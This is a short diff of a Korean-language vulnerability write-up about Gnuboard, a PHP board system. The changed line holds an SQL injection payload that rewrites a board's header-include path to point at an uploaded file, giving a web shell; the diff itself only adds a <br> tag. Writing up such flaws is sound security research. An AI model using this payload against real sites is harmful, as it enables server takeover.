@@ -87,5 +87,5 @@ fwrite($f, "define('G5_TABLE_PREFIX', '{$table_prefix}');\n\n");</code></pre>
 ## 다른 exploit 방법
 
 >그누보드에서는 각각의 게시판마다 g5_board 테이블에 있는 bo_include_head,bo_include_head 컬럼들의 값을 각각 상단 파일,하단 파일로 include합니다 때문에 다음과 같은 페이로드를 통해서 더욱 간단한 쉘 획득이 가능합니다.
->"notice as a inner join g5_board as b set b.bo_incldue_head=concat(0x2e2e2f646174612f6578706c6f69742f,(select bf_file from g5_board_file where wr_id=글 번호
+><br>"notice as a inner join g5_board as b set b.bo_incldue_head=concat(0x2e2e2f646174612f6578706c6f69742f,(select bf_file from g5_board_file where wr_id=글 번호
 ))"
